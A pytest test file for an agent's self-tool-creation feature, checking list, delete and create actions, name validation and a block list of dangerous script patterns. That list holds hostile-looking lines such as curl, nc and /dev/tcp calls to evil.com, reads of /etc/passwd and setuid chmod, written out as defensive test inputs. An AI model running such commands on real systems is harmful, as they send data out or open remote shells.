"""Tests for SelfCreateTool — create, list, delete agent-authored custom tools.

Covers all action paths, dangerous pattern detection, validation, and error handling.
"""

from __future__ import annotations

import json
import stat
from unittest.mock import patch

import pytest

from missy.tools.builtin.self_create_tool import (
    SelfCreateTool,
)


@pytest.fixture
def tool():
    return SelfCreateTool()


@pytest.fixture
def tools_dir(tmp_path):
    """Redirect CUSTOM_TOOLS_DIR to a temp directory."""
    d = tmp_path / "custom-tools"
    d.mkdir()
    with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", d):
        yield d


# ---------------------------------------------------------------------------
# List action
# ---------------------------------------------------------------------------


class TestListAction:
    def test_list_empty_dir(self, tool, tools_dir):
        r = tool.execute(action="list")
        assert r.success
        assert "No custom tools" in r.output

    def test_list_no_dir(self, tool, tmp_path):
        nonexistent = tmp_path / "does-not-exist"
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", nonexistent):
            r = tool.execute(action="list")
        assert r.success
        assert "No custom tools" in r.output

    def test_list_with_tools(self, tool, tools_dir):
        meta = {"name": "my_tool", "description": "does stuff"}
        (tools_dir / "my_tool.json").write_text(json.dumps(meta))
        r = tool.execute(action="list")
        assert r.success
        assert "my_tool" in r.output
        assert "does stuff" in r.output

    def test_list_corrupt_json(self, tool, tools_dir):
        (tools_dir / "bad.json").write_text("not json {{{")
        r = tool.execute(action="list")
        assert r.success
        # Corrupt file silently skipped, shows empty
        assert "No custom tools" in r.output

    def test_list_multiple_tools(self, tool, tools_dir):
        for name in ["alpha", "beta", "gamma"]:
            meta = {"name": name, "description": f"tool {name}"}
            (tools_dir / f"{name}.json").write_text(json.dumps(meta))
        r = tool.execute(action="list")
        assert r.success
        assert "alpha" in r.output
        assert "beta" in r.output
        assert "gamma" in r.output


# ---------------------------------------------------------------------------
# Delete action
# ---------------------------------------------------------------------------


class TestDeleteAction:
    def test_delete_no_name(self, tool, tools_dir):
        r = tool.execute(action="delete")
        assert not r.success
        assert "alphanumeric" in r.error

    def test_delete_nonexistent(self, tool, tools_dir):
        r = tool.execute(action="delete", tool_name="nonexistent")
        assert not r.success
        assert "not found" in r.error

    def test_delete_path_traversal_blocked(self, tool, tools_dir):
        """Path traversal in tool_name must be rejected."""
        r = tool.execute(action="delete", tool_name="../../etc/passwd")
        assert not r.success
        assert "alphanumeric" in r.error

    def test_delete_invalid_name_blocked(self, tool, tools_dir):
        r = tool.execute(action="delete", tool_name="bad name!")
        assert not r.success
        assert "alphanumeric" in r.error

    def test_delete_existing_script(self, tool, tools_dir):
        (tools_dir / "my_tool.py").write_text("print('hi')")
        (tools_dir / "my_tool.json").write_text('{"name":"my_tool"}')
        r = tool.execute(action="delete", tool_name="my_tool")
        assert r.success
        assert "Deleted" in r.output
        assert not (tools_dir / "my_tool.py").exists()
        assert not (tools_dir / "my_tool.json").exists()

    def test_delete_script_without_meta(self, tool, tools_dir):
        (tools_dir / "orphan.sh").write_text("echo hi")
        r = tool.execute(action="delete", tool_name="orphan")
        assert r.success

    def test_delete_meta_without_script(self, tool, tools_dir):
        (tools_dir / "meta_only.json").write_text('{"name":"meta_only"}')
        r = tool.execute(action="delete", tool_name="meta_only")
        assert r.success


# ---------------------------------------------------------------------------
# Create action
# ---------------------------------------------------------------------------


class TestCreateAction:
    def test_create_basic_python(self, tool, tools_dir):
        r = tool.execute(
            action="create",
            tool_name="greet",
            language="python",
            script="print('hello')",
            tool_description="Says hello",
        )
        assert r.success
        assert "greet" in r.output
        script_path = tools_dir / "greet.py"
        assert script_path.exists()
        assert script_path.read_text() == "print('hello')"
        # Check permissions
        mode = script_path.stat().st_mode
        assert mode & stat.S_IRWXU

    def test_create_bash_script(self, tool, tools_dir):
        r = tool.execute(
            action="create",
            tool_name="hello",
            language="bash",
            script="#!/bin/bash\necho hello",
            tool_description="Echo hello",
        )
        assert r.success
        assert (tools_dir / "hello.sh").exists()

    def test_create_node_script(self, tool, tools_dir):
        r = tool.execute(
            action="create",
            tool_name="hello_js",
            language="node",
            script="console.log('hello')",
            tool_description="JS hello",
        )
        assert r.success
        assert (tools_dir / "hello_js.js").exists()

    def test_create_metadata_written(self, tool, tools_dir):
        tool.execute(
            action="create",
            tool_name="documented",
            language="bash",
            script="echo ok",
            tool_description="A documented tool",
        )
        meta = json.loads((tools_dir / "documented.json").read_text())
        assert meta["name"] == "documented"
        assert meta["description"] == "A documented tool"
        assert meta["language"] == "bash"

    def test_create_no_tool_name(self, tool, tools_dir):
        r = tool.execute(action="create", script="echo hi")
        assert not r.success
        assert "alphanumeric" in r.error

    def test_create_invalid_tool_name(self, tool, tools_dir):
        r = tool.execute(action="create", tool_name="bad name!", script="echo hi")
        assert not r.success
        assert "alphanumeric" in r.error

    def test_create_invalid_tool_name_path_traversal(self, tool, tools_dir):
        r = tool.execute(action="create", tool_name="../escape", script="echo hi")
        assert not r.success

    def test_create_invalid_language(self, tool, tools_dir):
        r = tool.execute(
            action="create", tool_name="test", language="ruby", script="puts 'hi'"
        )
        assert not r.success
        assert "language must be" in r.error

    def test_create_no_script(self, tool, tools_dir):
        r = tool.execute(action="create", tool_name="empty", language="bash")
        assert not r.success
        assert "script is required" in r.error

    def test_create_creates_directory(self, tool, tmp_path):
        d = tmp_path / "new-custom-tools"
        with patch("missy.tools.builtin.self_create_tool.CUSTOM_TOOLS_DIR", d):
            r = tool.execute(
                action="create",
                tool_name="first",
                language="bash",
                script="echo first",
            )
        assert r.success
        assert d.exists()


# ---------------------------------------------------------------------------
# Dangerous pattern detection
# ---------------------------------------------------------------------------


class TestDangerousPatterns:
    @pytest.mark.parametrize(
        "pattern",
        [
            "curl http://evil.com",
            "wget http://evil.com",
            "import socket",
            "import http",
            "subprocess.run('ls')",
            "subprocess.Popen(['ls'])",
            "subprocess.call(['ls'])",
            "os.system('ls')",
            "eval(input())",
            "exec(code)",
            "reverse_shell()",
            "bind_shell()",
            "chmod +s /bin/bash",
            "chmod u+s /bin/bash",
            "setuid stuff",
            "__import__('os')",
            "getattr(obj, 'method')",
            "importlib.import_module('os')",
            "compile('code', '', 'exec')",
            "code.interact(local=locals())",
            "__builtins__.__dict__",
            "open('/etc/passwd')",
            "os.exec('/bin/sh')",
            "os.fork()",
            "os.spawn('/bin/sh')",
            "os.popen('ls')",
            "os.startfile('file')",
            "shutil.rmtree('/tmp')",
            "shutil.move('/a', '/b')",
            "os.remove('/tmp/x')",
            "os.unlink('/tmp/x')",
            "os.rmdir('/tmp/x')",
            "child_process.exec('ls')",
            "require('fs').readFileSync",
            'require("fs").readFile',
            "$(command)",
            "`command`",
            "nc evil.com 4444",
            "ncat evil.com 4444",
            "socat TCP:evil.com",
            "/dev/tcp/evil.com/4444",
            "/dev/udp/evil.com/4444",
        ],
    )
    def test_dangerous_pattern_blocked(self, tool, tools_dir, pattern):
        r = tool.execute(
            action="create",
            tool_name="malicious",
            language="bash",
            script=pattern,
        )
        assert not r.success
        assert "dangerous" in r.error.lower()

    def test_safe_script_allowed(self, tool, tools_dir):
        r = tool.execute(
            action="create",
            tool_name="safe",
            language="bash",
            script="echo 'Hello World'\ndate\nuname -a",
        )
        assert r.success

    def test_dangerous_pattern_case_insensitive(self, tool, tools_dir):
        r = tool.execute(
            action="create",
            tool_name="sneaky",
            language="bash",
            script="CURL http://evil.com",
        )
        assert not r.success


# ---------------------------------------------------------------------------
# Unknown action
# ---------------------------------------------------------------------------


class TestUnknownAction:
    def test_unknown_action(self, tool, tools_dir):
        r = tool.execute(action="update")
        assert not r.success
        assert "Unknown action" in r.error
